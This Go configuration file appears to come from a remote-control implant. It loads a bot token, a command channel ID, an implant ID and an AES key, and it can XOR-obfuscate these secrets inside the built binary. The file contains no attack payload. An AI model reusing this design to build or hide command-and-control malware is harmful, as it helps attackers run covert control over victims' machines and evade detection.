package config

import (
	"os"
	"strings"
)

// Config holds secrets injected at build time via -ldflags "-X ...=value"
// OR read from environment at runtime if ldflags were not supplied.
// secrets.go is gitignored; the build shims SD_* env vars into ldflags.
type Config struct {
	BotToken  string // "Bot <token>"
	ChannelID string // command channel id
	TargetID  string // unique implant id (hex)
	AESKeyHex string // 32-byte (256-bit) hex key
	Self      string // "agent" or "cli"
}

// Internal linker-injected vars (overwritten via ldflags -X)
var (
	ldBotToken  = ""
	ldChannelID = ""
	ldTargetID  = ""
	ldAESKeyHex = ""
	ldSelf      = ""
)

// Load resolves config in priority order: XOR obfuscated > ldflags > env > empty.
// When built with -tags obfuscate, secrets are XOR-decoded from build-time
// generated variables (secrets_obfuscated.go). Otherwise secrets_off.go
// provides empty stubs and Load falls through to ldflags/env.
func Load() Config {
	c := Config{
		BotToken:  ensureBotPrefix(resolveSecret(xorBotToken, xorKey, ldBotToken, "SD_BOT_TOKEN")),
		ChannelID: resolveSecret(xorChannelID, xorKey, ldChannelID, "SD_CHANNEL_ID"),
		TargetID:  resolveSecret(xorTargetID, xorKey, ldTargetID, "SD_TARGET_ID"),
		AESKeyHex: resolveSecret(xorAESKeyHex, xorKey, ldAESKeyHex, "SD_AES_KEY_HEX"),
		Self:      firstNonEmpty(ldSelf, os.Getenv("SD_SELF")),
	}
	return c
}

// resolveSecret tries XOR-obfuscated secret first, then ldflags, then env.
func resolveSecret(xorData, xorKey []byte, ldVal, envKey string) string {
	if s := xorDecode(xorData, xorKey); s != "" {
		return s
	}
	return firstNonEmpty(ldVal, os.Getenv(envKey))
}

func firstNonEmpty(vals ...string) string {
	for _, v := range vals {
		if v != "" {
			return v
		}
	}
	return ""
}

func ensureBotPrefix(s string) string {
	if s == "" {
		return ""
	}
	if strings.HasPrefix(s, "Bot ") {
		return s
	}
	return "Bot " + s
}